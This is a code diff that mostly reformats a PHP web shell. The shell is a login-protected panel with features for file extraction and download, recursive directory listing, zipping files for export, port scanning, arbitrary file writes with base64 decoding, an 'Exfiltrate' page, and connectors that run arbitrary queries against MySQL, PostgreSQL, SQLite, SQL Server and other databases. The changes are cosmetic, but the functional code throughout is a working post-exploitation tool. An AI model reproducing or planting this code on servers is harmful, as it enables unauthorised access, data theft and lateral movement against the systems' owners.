         }
@@ -191,8 +246,7 @@ EOD;
      *
      * @return string
      */
-    function makeNavLink($page, $current_page, $definition)
-    {
+    function makeNavLink($page, $current_page, $definition) {
         if ($definition["hidden"]) {
             return "";
         }
@@ -224,8 +278,7 @@ EOD;
      *
      * @return string
      */
-    function makePageHeader($title, $description)
-    {
+    function makePageHeader($title, $description) {
         ob_start();
         ?>
         <div class="lg:flex lg:items-center lg:justify-between">
@@ -262,8 +315,16 @@ EOD;
      *
      * @return string
      */
-    function makeInput($type, $label, $name, $placeholder, $description, $required = false, $query_param = null, $value = null)
-    {
+    function makeInput(
+        $type,
+        $label,
+        $name,
+        $placeholder,
+        $description,
+        $required = false,
+        $query_param = null,
+        $value = null
+    ) {
         ob_start();
         if ($type !== "textarea") {
             ?>
@@ -298,7 +359,8 @@ EOD;
                 </p>
             </div>
             <?php
-        } else {
+        }
+        else {
             ?>
             <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
                 <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
@@ -344,8 +406,7 @@ EOD;
      *
      * @return string
      */
-    function makeSelect($label, $name, $options, $required = false, $disable_reason = null)
-    {
+    function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
         ob_start();
         ?>
         <div id="<?php echo $name ?>-container">
@@ -369,14 +430,14 @@ EOD;
                 <?php
                 foreach ($options as $option) {
                     echo "<option value='" .
-                        $option["value"] .
-                        "' " .
-                        ($option["disabled"] ? "disabled" : "") .
-                        ($option["selected"] ? "selected" : "") .
-                        ">" .
-                        $option["label"] .
-                        ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
-                        "</option>";
+                         $option["value"] .
+                         "' " .
+                         ($option["disabled"] ? "disabled" : "") .
+                         ($option["selected"] ? "selected" : "") .
+                         ">" .
+                         $option["label"] .
+                         ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
+                         "</option>";
                 }
                 ?>
             </select>
@@ -393,12 +454,11 @@ EOD;
      * @param $description string Description of the checkbox
      * @param $is_checked bool Whether the checkbox is checked
      * @param $value string Value of the checkbox, default is "y"
-     * @param $onclick string OnClick event for the checkbox
+     * @param $onclick string|null OnClick event for the checkbox
      *
      * @return string
      */
-    function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null)
-    {
+    function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
         ob_start();
         ?>
         <div class="relative flex items-start" id="<?php echo $name ?>-container">
@@ -440,8 +500,14 @@ EOD;
      *
      * @return string
      */
-    function makeForm($operation, $action, $elements, $method = "post", $submit_label = "Run operation", $classes = "flex flex-col gap-y-6 max-w-xl mt-8")
-    {
+    function makeForm(
+        $operation,
+        $action,
+        $elements,
+        $method = "post",
+        $submit_label = "Run operation",
+        $classes = "flex flex-col gap-y-6 max-w-xl mt-8"
+    ) {
         ob_start();
         ?>
         <form action="<?php echo $action ?>" method="<?php echo $method ?>"
@@ -470,8 +536,7 @@ EOD;
      *
      * @return string
      */
-    function makePage($elements, $current_page)
-    {
+    function makePage($elements, $current_page) {
         global $ENABLED_FEATURES, $CSS, $LOGIN;
         if ($_SESSION["auth"] !== true) {
             header("Location: ?page=" . $LOGIN);
@@ -528,8 +593,7 @@ EOD;
      *
      * @return string
      */
-    function makeLoginPage()
-    {
+    function makeLoginPage() {
         global $CSS, $LOGIN;
         ob_start();
         ?>
@@ -602,12 +666,11 @@ EOD;
     /**
      * Create a code highlight element
      *
-     * @param $code string|int|float Code to highlight
+     * @param $code float|int|string Code to highlight
      *
      * @return string
      */
-    function makeCodeHighlight($code)
-    {
+    function makeCodeHighlight($code) {
         ob_start();
         ?>
         <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -623,8 +686,7 @@ EOD;
      *
      * @return string
      */
-    function makeAlert($title, $message)
-    {
+    function makeAlert($title, $message) {
         ob_start();
         ?>
         <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
@@ -658,8 +720,7 @@ EOD;
      *
      * @return string
      */
-    function makeTable($title, $description, $rows, $columns = null)
-    {
+    function makeTable($title, $description, $rows, $columns = null, $action_form = null) {
         $columns = $columns ?: array_keys($rows[0]);
         ob_start();
         ?>
@@ -670,10 +731,11 @@ EOD;
                     <p class="mt-2 text-sm text-gray-700"><?php echo $description; ?></p>
                 </div>
                 <div class="mt-4 sm:ml-16 sm:mt-0 sm:flex-none">
-                    <button type="button"
-                            class="block rounded-md bg-indigo-600 px-3 py-2 text-center text-sm font-semibold text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600">
-                        Add user
-                    </button>
+                    <?php
+                    if ($action_form !== null) {
+                        echo $action_form;
+                    }
+                    ?>
                 </div>
             </div>
             <div class="mt-8 flow-root">
@@ -691,21 +753,22 @@ EOD;
                                 </tr>
                                 </thead>
                                 <tbody class="divide-y divide-gray-200 bg-white">
-                                <tr>
-                                    <?php
-                                    foreach ($rows as $row) {
-                                        foreach ($columns as $key => $column) {
-                                            if (is_array($row[$key])) {
-                                                echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" . implode(", ", $row[$key]) . "</td>";
-                                            } else {
-                                                echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
-                                            }
+                                <?php
+                                foreach ($rows as $row) {
+                                    echo "<tr>";
+                                    foreach ($columns as $key => $column) {
+                                        if (is_array($row[$key])) {
+                                            echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" .
+                                                 implode(", ", $row[$key]) .
+                                                 "</td>";
+                                        }
+                                        else {
+                                            echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
                                         }
                                     }
-                                    ?>
-                                </tr>
-
-                                <!-- More people... -->
+                                    echo "</tr>";
+                                }
+                                ?>
                                 </tbody>
                             </table>
                         </div>
@@ -713,7 +776,6 @@ EOD;
                 </div>
             </div>
         </div>
-
         <?php
         return ob_get_clean();
     }
@@ -721,7 +783,10 @@ EOD;
     /**
      * Open the command output screen where output can be freely written
      *
+     * @param string $classes Classes to apply to the command output screen
      * @param string $title Title of the command output screen
+     * @param bool $no_margin Whether to remove the margin from the command output screen
+     * @param bool $no_padding Whether to remove the padding from the command output screen
      *
      * @return void
      */
@@ -745,8 +810,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function closeCommandOutputScreen()
-    {
+    function closeCommandOutputScreen() {
         ?></pre>
         </div>
         </div>
@@ -757,12 +821,11 @@ echo $no_padding ? "" : "py-10 ";
     /**
      * Output data to the command output screen
      *
-     * @param string|array $data Data to output
+     * @param array|string $data Data to output
      *
      * @return void
      */
-    function out($data)
-    {
+    function out($data) {
         if (is_array($data)) {
             $data = implode("\n", $data);
         }
@@ -770,27 +833,28 @@ echo $no_padding ? "" : "py-10 ";
         flush();
     }
 
-///////////////////////
-// CODE BLOCK START  //
-///////////////////////
+    ///////////////////////
+    // CODE BLOCK START  //
+    ///////////////////////
 
     /**
      * Download a file in chunks
      *
      * @param $filepath string Path to the file to download
      * @param $filesize int Size of the file
-     * @param $filename string Name of the file to download or null to use the original filename
+     * @param $filename string|null Name of the file to download or null to use the original filename
      *
      * @return void
      */
-    function chunkedDownload($filepath, $filesize, $filename = null)
-    {
+    function chunkedDownload($filepath, $filesize, $filename = null) {
         $chunk_size = 4096; // Adjust chunk size as needed
 
         header('Content-Description: File Transfer');
         header('Content-Type: application/octet-stream'); // Adjust content type if needed
         header(
-            'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"'
+            'Content-Disposition: attachment; filename="' .
+            (!is_null($filename) ? $filename : basename($filepath)) .
+            '"'
         );
         header('Content-Transfer-Encoding: chunked');
         header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
@@ -811,11 +875,10 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handleFileExtraction()
-    {
+    function handleFileExtraction() {
         $filepath = $_POST['__PARAM_1__'];
-        $preview = strtolower($_POST['__PARAM_2__']) === "y";
-        $export = strtolower($_POST['__PARAM_3__']) === "y";
+        $preview  = strtolower($_POST['__PARAM_2__']) === "y";
+        $export   = strtolower($_POST['__PARAM_3__']) === "y";
 
         if (!file_exists($filepath)) {
             echo "Error: File '$filepath' does not exist.\n";
@@ -828,7 +891,7 @@ echo $no_padding ? "" : "py-10 ";
         echo "File size: " . formatBytes($filesize) . "\n";
         if ($preview) {
             $preview_content = fopen($filepath, "r");
-            $read = fread($preview_content, 10240); // Read 10Kb
+            $read            = fread($preview_content, 10240); // Read 10Kb
             fclose($preview_content);
             echo "Preview:\n" . htmlspecialchars($read, ENT_QUOTES, "UTF-8") . "\n";
 
@@ -837,7 +900,8 @@ echo $no_padding ? "" : "py-10 ";
 
         if ($filesize < 102400) { // Less than 100Kb
             chunkedDownload($filepath, $filesize);
-        } elseif ($export) {
+        }
+        elseif ($export) {
             chunkedDownload($filepath, $filesize);
         }
     }
@@ -847,9 +911,8 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handleDirectoryListing()
-    {
-        $path = $_POST['__PARAM_1__'];
+    function handleDirectoryListing() {
+        $path      = $_POST['__PARAM_1__'];
         $max_depth = $_POST['__PARAM_2__'];
 
         listFilesRecursive($path, $max_depth);
@@ -865,8 +928,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true)
-    {
+    function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
         if (is_string($max_depth) && strtolower($max_depth) === "inf") {
             $max_depth = INF;
         }
@@ -890,7 +952,8 @@ echo $no_padding ? "" : "py-10 ";
                     // Recursively list files if depth is less than max depth
                     if ($depth < $max_depth) {
                         listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
-                    } else {
+                    }
+                    else {
                         // Print information for files beyond max depth
                         getStatForCurrentPath($sub_path);
                     }
@@ -908,23 +971,22 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return array
      */
-    function getStatForCurrentPath($path)
-    {
+    function getStatForCurrentPath($path) {
         $stat = stat($path);
 
         // Print information for current path
         $perm = getPermissionsString($path);
         echo "$perm " .
-            pad_right("" . $stat["nlink"], 3) .
-            " " .
-            pad_right("" . $stat["uid"], 5) .
-            " " .
-            pad_right("" . $stat["gid"], 5) .
-            " " .
-            formatBytes($stat["size"]) .
-            " " .
-            convertUnixTimestampToDate($stat["mtime"]) .
-            " $path\n";
+             pad_right("" . $stat["nlink"], 3) .
+             " " .
+             pad_right("" . $stat["uid"], 5) .
+             " " .
+             pad_right("" . $stat["gid"], 5) .
+             " " .
+             formatBytes($stat["size"]) .
+             " " .
+             convertUnixTimestampToDate($stat["mtime"]) .
+             " $path\n";
 
         return array($stat, $perm);
     }
@@ -932,12 +994,11 @@ echo $no_padding ? "" : "py-10 ";
     /**
      * Get the permissions string for a file or directory (unix like `ls -l` output)
      *
-     * @param $path
+     * @param $path string Path to get permissions for
      *
      * @return string
      */
-    function getPermissionsString($path)
-    {
+    function getPermissionsString($path) {
         if (!file_exists($path)) {
             return "----------";
         }
@@ -948,7 +1009,8 @@ echo $no_padding ? "" : "py-10 ";
         $type = '';
         if (is_dir($path)) {
             $type = 'd';
-        } elseif (is_file($path)) {
+        }
+        elseif (is_file($path)) {
             $type = '-';
         }
 
@@ -973,13 +1035,12 @@ echo $no_padding ? "" : "py-10 ";
     /**
      * Pad a string to the left with spaces
      *
-     * @param $str
-     * @param $pad_length
+     * @param $str string String to pad
+     * @param $pad_length int Length to pad to
      *
-     * @return mixed|string
+     * @return string
      */
-    function pad_right($str, $pad_length = 10)
-    {
+    function pad_right($str, $pad_length = 10) {
         // Ensure string and pad length are valid
         if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
             return $str; // Return unmodified string for invalid input
@@ -990,19 +1051,18 @@ echo $no_padding ? "" : "py-10 ";
     }
 
     /**
-     * Format bytes to human readable format
+     * Format bytes to human-readable format
      *
-     * @param $bytes
+     * @param $bytes array|int|float Bytes to format
      *
      * @return string
      */
-    function formatBytes($bytes)
-    {
+    function formatBytes($bytes) {
         $units = array('B', 'KB', 'MB', 'GB', 'TB');
 
         $bytes = max($bytes, 0);
-        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
-        $pow = min($pow, count($units) - 1);
+        $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
+        $pow   = min($pow, count($units) - 1);
 
         // Calculate size in the chosen unit
         $bytes /= pow(1024, $pow);
@@ -1014,24 +1074,22 @@ echo $no_padding ? "" : "py-10 ";
     /**
      * Convert a Unix timestamp to a date string
      *
-     * @param $timestamp
+     * @param $timestamp int Unix timestamp
      *
-     * @return false|string
+     * @return string
      */
-    function convertUnixTimestampToDate($timestamp)
-    {
+    function convertUnixTimestampToDate($timestamp) {
         return date('Y-m-d H:i:s', $timestamp);
     }
 
     /**
      * Get the shortest common path from a list of paths
      *
-     * @param $paths
+     * @param $paths string[] List of paths
      *
      * @return string|null
      */
-    function getShortestCommonPath($paths)
-    {
+    function getShortestCommonPath($paths) {
         if (empty($paths)) {
             return null;
         }
@@ -1039,15 +1097,19 @@ echo $no_padding ? "" : "py-10 ";
         $shortest_path = $paths[0]; // Initialize with first path
 
         foreach ($paths as $path) {
-            $common_path = '';
-            $path_segments = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
+            $common_path       = '';
+            $path_segments     = explode(
+                DIRECTORY_SEPARATOR,
+                trim($path, DIRECTORY_SEPARATOR)
+            ); // Split path by separator
             $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));
 
             $min_length = min(count($path_segments), count($shortest_segments));
             for ($i = 0; $i < $min_length; $i++) {
                 if ($path_segments[$i] === $shortest_segments[$i]) {
                     $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
-                } else {
+                }
+                else {
                     break;
                 }
             }
@@ -1063,8 +1125,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handleCreateZip()
-    {
+    function handleCreateZip() {
         $content = $_POST['__PARAM_1__'];
 
         if (!extension_loaded('zip')) {
@@ -1075,7 +1136,7 @@ echo $no_padding ? "" : "py-10 ";
             return;
         }
 
-        $zip = new ZipArchive();
+        $zip      = new ZipArchive();
         $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
 
         if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
@@ -1086,13 +1147,13 @@ echo $no_padding ? "" : "py-10 ";
             return;
         }
 
-        $lines = explode("\n", $content);
+        $lines            = explode("\n", $content);
         $path_replacement = getShortestCommonPath($lines);
         foreach ($lines as $line) {
             $parts = explode(',', trim($line)); // Split line by comma
-            $path = isset($parts[0]) ? $parts[0] : '';
+            $path  = isset($parts[0]) ? $parts[0] : '';
 
-            $recursive = in_array('with_tree', $parts);
+            $recursive  = in_array('with_tree', $parts);
             $extensions = array();
 
             foreach ($parts as $part) {
@@ -1119,9 +1180,16 @@ echo $no_padding ? "" : "py-10 ";
                             )  // Replace backslashes with forward slashes
                         ) // Remove common path from filename
                     );
-                } else {
+                }
+                else {
                     if (is_dir($path) && is_readable($path)) {
-                        addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
+                        addDirectoryToZip(
+                            $path,
+                            $zip,
+                            $recursive,
+                            $extensions,
+                            $path_replacement . DIRECTORY_SEPARATOR
+                        );
                     }
                 }
             }
@@ -1145,8 +1213,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "")
-    {
+    function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
         $dir_handle = opendir($dir);
 
         while (($file = readdir($dir_handle)) !== false) {
@@ -1155,7 +1222,8 @@ echo $no_padding ? "" : "py-10 ";
 
                 if (
                     is_file($sub_path) &&
-                    ($extensions === array() || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
+                    ($extensions === array() ||
+                     in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
                 ) {
                     $zip->addFile(
                         $sub_path,
@@ -1169,7 +1237,8 @@ echo $no_padding ? "" : "py-10 ";
                             )  // Replace backslashes with forward slashes
                         ) // Remove common path from filename
                     ); // Add with relative path within zip
-                } else {
+                }
+                else {
                     if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                         addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                     }
@@ -1185,11 +1254,10 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handlePortScan()
-    {
-        $host = $_POST['__PARAM_1__'];
+    function handlePortScan() {
+        $host      = $_POST['__PARAM_1__'];
         $startPort = intval($_POST['__PARAM_2__']);
-        $endPort = intval($_POST['__PARAM_3__']);
+        $endPort   = intval($_POST['__PARAM_3__']);
 
         out("Scanning ports $startPort to $endPort on $host...");
 
@@ -1203,7 +1271,8 @@ echo $no_padding ? "" : "py-10 ";
                 // The port is open
                 fclose($socket);
                 out("Port $port: OPEN");
-            } else {
+            }
+            else {
                 // The port is closed or unreachable
                 out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
             }
@@ -1216,11 +1285,11 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handleWriteFile()
-    {
-        $filename = $_POST['__PARAM_1__'];
+    function handleWriteFile() {
+        $filename               = $_POST['__PARAM_1__'];
         $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
-        $content = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
+        $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__'])
+            : $_POST['__PARAM_2__'];
 
         out(
             array(
@@ -1238,8 +1307,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function handleLogin()
-    {
+    function handleLogin() {
         global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
         $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
         $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);
@@ -1255,8 +1323,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return string
      */
-    function makeExfiltratePage()
-    {
+    function makeExfiltratePage() {
         global $EXFILTRATE, $ENABLED_FEATURES;
         return makePage(
             array(
@@ -1292,8 +1359,7 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return string
      */
-    function listEnabledExtensions()
-    {
+    function listEnabledExtensions() {
         $extensions = get_loaded_extensions();
         ob_start();
         openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
@@ -1312,18 +1378,19 @@ echo $no_padding ? "" : "py-10 ";
      *
      * @return void
      */
-    function runPDOQuery($pdo, $query)
-    {
+    function runPDOQuery($pdo, $query) {
         $stmt = $pdo->query($query);
         if ($stmt) {
             $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
             if ($result) {
                 echo "[Driver: PDO] Query executed successfully.\n";
                 printAsciiTable($result);
-            } else {
+            }
+            else {
                 echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
             }
-        } else {
+        }
+        else {
             echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
         }
     }
@@ -1331,19 +1398,18 @@ echo $no_padding ? "" : "py-10 ";
     /**
      * Print an ASCII table from the given data
      *
-     * @param $data
+     * @param $data array[] Data to print
      *
      * @return void
      */
-    function printAsciiTable($data)
-    {
+    function printAsciiTable($data) {
         // Get column headers
         $headers = array_keys($data[0]);
 
         // Calculate column widths
         $columnWidths = array();
         foreach ($headers as $header) {
-            $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+            $columnWidths[$header] = max(array_map('strlen', _array_column($data, $header))) + 2;
         }
 
         // Print top row
@@ -1394,19 +1460,21 @@ echo $no_padding ? "" : "py-10 ";
      * @param $username string Username to connect with
      * @param $password string Password to connect with
      * @param $host string Host to connect to
-     * @param $port int Port to connect to
-     * @param $service_name string Service name to use for connection
-     * @param $sid string SID to use for connection
-     * @param $database string Database to connect to
-     * @param $charset string Charset to use for connection
-     * @param $options string Options to use for connection
-     * @param $role string Role to use for connection
-     * @param $dialect string Dialect to use for connection
-     * @param $odbc_driver string ODBC driver to use for connection
-     * @param $server string Informix server name
+     * @param $port int|null Port to connect to
+     * @param $service_name string|null Service name to use for connection
+     * @param $sid string|null SID to use for connection
+     * @param $database string|null Database to connect to
+     * @param $charset string|null Charset to use for connection
+     * @param $options string|null Options to use for connection
+     * @param $role string|null Role to use for connection
+     * @param $dialect string|null Dialect to use for connection
+     * @param $odbc_driver string|null ODBC driver to use for connection
+     * @param $server string|null Informix server name
      * @param $protocol string Protocol to use for connection
-     * @param $enableScrollableCursors string Whether to enable scrollable cursors
+     * @param $enableScrollableCursors string|null Whether to enable scrollable cursors
      * @param $raw_connection_string string Raw connection string to use for connection
+     * @param $query string|null Query to run
+     * @param $collection string|null Collection to use for connection
      *
      * @return void
      */
@@ -1430,8 +1498,7 @@ echo $no_padding ? "" : "py-10 ";
         $raw_connection_string = "",
         $query = null,
         $collection = null
-    )
-    {
+    ) {
         if ($db_type === 'mysql') {
             $port = $port ?: 3306;
 
@@ -1441,7 +1508,8 @@ echo $no_padding ? "" : "py-10 ";
 
                 if (!$connection) {
                     echo "[Driver: mysql] Connection failed: " . mysql_error();
-                } else {
+                }
+                else {
                     echo "[Driver: mysql] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1453,12 +1521,14 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: mysql] Query failed: " . mysql_error();
                         }
                     }
                 }
-            } // Check if the MySQLi extension is loaded
+            }
+            // Check if the MySQLi extension is loaded
             elseif (extension_loaded("mysqli")) {
                 mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
                 try {
@@ -1466,7 +1536,8 @@ echo $no_padding ? "" : "py-10 ";
 
                     if (!$connection) {
                         echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
-                    } else {
+                    }
+                    else {
                         echo "[Driver: mysqli] Connected successfully using $username:$password.\n";
 
                         if (!empty($query)) {
@@ -1478,20 +1549,23 @@ echo $no_padding ? "" : "py-10 ";
                                     $rows[] = $row;
                                 }
                                 printAsciiTable($rows);
-                            } else {
+                            }
+                            else {
                                 echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
                             }
                         }
                     }
-                } catch (mysqli_sql_exception $e) {
+                }
+                catch (mysqli_sql_exception $e) {
                     echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the PDO MySQL extension is loaded
+            }
+            // Check if the PDO MySQL extension is loaded
             elseif (extension_loaded("pdo_mysql")) {
                 try {
                     $dsn = "mysql:host=$host;port=$port" .
-                        (!empty($database) ? ";dbname=$database" : "") .
-                        (!empty($charset) ? ";charset=$charset" : "");
+                           (!empty($database) ? ";dbname=$database" : "") .
+                           (!empty($charset) ? ";charset=$charset" : "");
 
                     $pdo = new PDO($dsn, $username, $password);
                     echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";
@@ -1499,24 +1573,28 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
+            }
+            // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
             elseif (extension_loaded("pdo")) {
                 echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
-            } else {
+            }
+            else {
                 echo "[Driver: none] MySQL extension is not loaded.\n";
             }
-        } elseif ($db_type === 'cubrid') {
+        }
+        elseif ($db_type === 'cubrid') {
             $port = $port ?: 30000;
 
             // Check if the CUBRID PDO extension is loaded
             if (extension_loaded("pdo_cubrid")) {
                 try {
                     $dsn = "cubrid:host=$host;port=$port" .
-                        (!empty($database) ? ";dbname=$database" : "") .
-                        (!empty($charset) ? ";charset=$charset" : "");
+                           (!empty($database) ? ";dbname=$database" : "") .
+                           (!empty($charset) ? ";charset=$charset" : "");
 
                     $pdo = new PDO($dsn, $username, $password);
                     echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";
@@ -1524,16 +1602,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the CUBRID extension is loaded
+            }
+            // Check if the CUBRID extension is loaded
             elseif (extension_loaded("cubrid")) {
                 $connection = cubrid_connect($host, $port, $database, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
-                } else {
+                }
+                else {
                     echo "[Driver: cubrid] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1545,15 +1626,18 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] CUBRID extension is not loaded.\n";
             }
-        } elseif ($db_type === 'pgsql') {
+        }
+        elseif ($db_type === 'pgsql') {
             $port = $port ?: 5432;
 
             // Check if the PostgreSQL PDO extension is loaded
@@ -1567,16 +1651,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the PostgreSQL extension is loaded
+            }
+            // Check if the PostgreSQL extension is loaded
             elseif (extension_loaded("pgsql")) {
                 $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");
 
                 if (!$connection) {
                     echo "[Driver: pgsql] Connection failed: " . pg_last_error();
-                } else {
+                }
+                else {
                     echo "[Driver: pgsql] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1588,15 +1675,18 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] PostgreSQL extension is not loaded.\n";
             }
-        } elseif ($db_type === 'sqlite') {
+        }
+        elseif ($db_type === 'sqlite') {
             // Check if the SQLite PDO extension is loaded
             if (extension_loaded("pdo_sqlite")) {
                 try {
@@ -1608,16 +1698,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the SQLite extension is loaded
+            }
+            // Check if the SQLite extension is loaded
             elseif (extension_loaded("sqlite3")) {
                 $connection = sqlite_open($host, 0666, $error);
 
                 if (!$connection) {
                     echo "[Driver: sqlite3] Connection failed: $error";
-                } else {
+                }
+                else {
                     echo "[Driver: sqlite3] Connected successfully using $host.\n";
 
                     if (!empty($query)) {
@@ -1629,15 +1722,19 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
-                            echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
+                        }
+                        else {
+                            echo "[Driver: sqlite3] Query failed: " .
+                                 sqlite_error_string(sqlite_last_error($connection));
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] SQLite extension is not loaded.\n";
             }
-        } elseif ($db_type === 'sqlsrv') {
+        }
+        elseif ($db_type === 'sqlsrv') {
             $port = $port ?: 1433;
 
             // Check if the SQL Server PDO extension is loaded
@@ -1651,13 +1748,18 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the SQL Server extension is loaded
+            }
+            // Check if the SQL Server extension is loaded
             elseif (extension_loaded("sqlsrv")) {
                 echo "Connecting to $host with default instance specification ...\n";
-                $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));
+                $connection = sqlsrv_connect(
+                    $host,
+                    array("Database" => $database, "UID" => $username, "PWD" => $password)
+                );
 
                 if (!$connection) {
                     echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
@@ -1670,10 +1772,12 @@ echo $no_padding ? "" : "py-10 ";
 
                     if (!$connection) {
                         echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
-                    } else {
+                    }
+                    else {
                         echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).\n";
                     }
-                } else {
+                }
+                else {
